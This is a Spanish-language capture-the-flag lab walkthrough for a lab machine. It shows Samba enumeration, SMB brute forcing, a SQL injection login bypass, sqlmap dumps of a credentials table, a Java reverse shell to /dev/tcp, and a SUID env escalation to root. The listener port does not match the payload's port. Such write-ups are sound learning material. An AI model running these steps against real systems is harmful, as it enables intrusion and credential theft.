## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

Puerto 139 : netbios—ssn Samba smbd

Puerto 445 :  netbios—ssn Samba smbd

Empiezo por Samba:

```bash
enum4linux -a 172.17.0.2
```

Encuentro user bob, dylan y augustus y pruebo fuerza bruta:

```bash
crackmapexec smb IP -u users.txt -p DICCIONARIO —shares
```

Solo encuentro credenciales para bob y augustus.

Revisando el servicio no encuentro nada. 

Viendo la web hay un login, con una SQL injection básica: 

```bash
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Logro acceder a un panel que dice que dylan accedió correctamente, no nos sirve de mucho y pruebo Sqlmap:

```bash
sqlmap -r request.txt --dbs
```

Interesa “registers”:

```bash
sqlmap -r request.txt -D register --tables --batch
```

Encuentro la tabla users y la dumpeo:

```bash
sqlmap -r request.txt -D register -T users --dump --batch

# Info:

+------------------+----------+
| passwd           | username |
+------------------+----------+
| KJSDFG789FGSDF78 | dylan    |
+------------------+----------+
```

Pruebo en SSH pero no tengo resultado, pero samba si.

```bash
smbclient //172.17.0.2/shared -U dylan
```

Encuentro “augustus.txt” :

```bash
061fba5bdfc076bb7362616668de87c8
# Hash crackeado:
lovely 
```

Es la contraseña de Augustus para SSH.

## Escalada Augustus  → Dylan

```bash
sudo -l
(dylan) /usr/bin/java
```

Creo un archivo malicioso en /tmp llamado shell.java:

```bash
public class Shell {
    public static void main(String[] args) {
        Process p;
        try {
            p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/172.17.0.1/443 0>&1");
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
```

En el host me pongo a la escucha:

```bash
nc -nlvp 4444
```

Desde el servidor lo ejecuto:

```bash
sudo -u dylan /usr/bin/java /tmp/shell.java
```

## Escalada Dylan → Root

Listo SUID

```bash
find / -perm -4000 -ls 2>/dev/null
```

Encuentro:

```bash
5761950     44 -rwsr-xr-x   1 root     root          43976 Jan  8  2024 /usr/bin/env
```

Gracias GTFO Bins:

```bash
/usr/bin/env /bin/bash -p
```

Listo.
